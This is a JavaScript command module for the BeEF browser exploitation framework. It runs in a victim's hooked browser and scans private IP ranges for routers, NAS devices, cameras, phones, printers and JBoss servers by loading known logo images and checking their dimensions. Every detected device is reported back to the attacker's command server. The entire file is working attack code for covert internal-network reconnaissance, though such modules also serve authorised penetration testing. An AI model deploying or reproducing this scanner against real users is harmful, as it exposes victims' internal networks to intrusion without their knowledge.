//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var dom = document.createElement('b');
    var ips = new Array();
    ipRange = "<%= @ipRange %>";
    ports = "<%= @ports %>";
    if(ports != null){
     ports = ports.split(',');
    }

    if(ipRange != null){
        // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
        // (only C class IPs are supported atm)
        ipBounds = ipRange.split('-');
        lowerBound = ipBounds[0].split('.')[3];
        upperBound = ipBounds[1].split('.')[3];

        for(i=lowerBound;i<=upperBound;i++){
            ipToTest = "http://"+ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
            ips.push(ipToTest);
        }
    }else{
        //use default IPs
        ips = [
            'http://192.168.0.1',
            'http://192.168.0.100',
            'http://192.168.0.254',
            'http://192.168.1.1',
            'http://192.168.1.100',
            'http://192.168.1.254',
            'http://10.0.0.1',
            'http://10.1.1.1',
            'http://192.168.2.1',
            'http://192.168.2.254',
            'http://192.168.100.1',
            'http://192.168.100.254',
            'http://192.168.123.1',
            'http://192.168.123.254',
            'http://192.168.10.1',
            'http://192.168.10.254'
        ];
    }

	var urls = new Array(
    // in the form of: "Dev/App Name","Default Port","Use Multiple Ports if specified","IMG url","IMG width","IMG height"
	new Array("QNAP NAS",":8080",false,"/ajax_obj/img/running.gif",16,16),
	new Array("QNAP NAS",":8080",false,"/ajax_obj/images/qnap_logo_w.gif",115,21),
	new Array("Belkin Router",":80",false,"/images/title_2.gif",321,28),
	new Array("SMC Networks",":80",false,"/images/logo.gif",133,59),
	new Array("Linksys NAS",":80",false,"/Admin_top.JPG",750,52),
	new Array("Linksys NAS",":80",false,"/logo.jpg",194,52),
	new Array("Linksys Network Camera",":80",false,"/welcome.jpg",146,250),
	new Array("Linksys Wireless-G Camera",":80",false,"/header.gif",750,97),
	new Array("Cisco IP Phone",":80",false,"/Images/Logo",120,66),
	new Array("Snom Phone",":80",false,"/img/snom_logo.png",168,62),
	new Array("Brother Printer",":80",false,"/pbio/brother.gif",144,52),
	new Array("HP LaserJet",":80",false,"/hp/device/images/logo.gif",42,27),
    new Array("JBoss Application server",":8080",true,"/images/logo.gif",226,105)
	);

	// for each ip
	for(var i=0; i < ips.length; i++) {
		// for each url
		for(var u=0; u < urls.length; u++) {
            if(!urls[u][2] && ports != null){ // use default port
                var img = new Image;
                //console.log("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
                img.id = u;
                img.src = ips[i]+urls[u][1]+urls[u][3];
                img.onload = function() { if (this.width == urls[this.id][4] && this.height == urls[this.id][5]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'device='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
                dom.appendChild(img);
            }else{ // iterate to all the specified ports
                for(p=0;p<ports.length;p++){
                    var img = new Image;
                    //console.log("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "], port [" + ports[p] + "]");
                    img.id = u;
                    img.src = ips[i]+":"+ports[p]+urls[u][3];
                    img.onload = function() { if (this.width == urls[this.id][4] && this.height == urls[this.id][5]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'device='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
                    dom.appendChild(img);
                }
            }
		}
	}
});

